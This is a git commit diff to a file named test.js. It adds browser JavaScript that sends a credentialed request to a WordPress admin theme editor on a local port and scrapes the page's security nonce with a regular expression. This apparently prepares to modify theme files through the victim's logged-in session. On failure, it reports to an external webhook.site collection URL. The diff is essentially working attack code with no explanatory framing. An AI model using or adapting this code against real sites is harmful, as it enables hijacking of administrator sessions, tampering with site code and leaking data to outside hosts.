45a690e511f81592ae978fc9055e859673de72bd
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 12:46:48 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,6 +1,6 @@
 try{
-  //await fetch("http://localhost:1024/",{mode:'no-cors'});
-  var a = await fetch(`https://localhost:1024/wp-admin/`,{"credentials":"include","mode":"cors"});
+  
+  var a = await fetch('https://localhost:1024/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include","mode":"cors"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
   
 }catch(err){
   fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err);
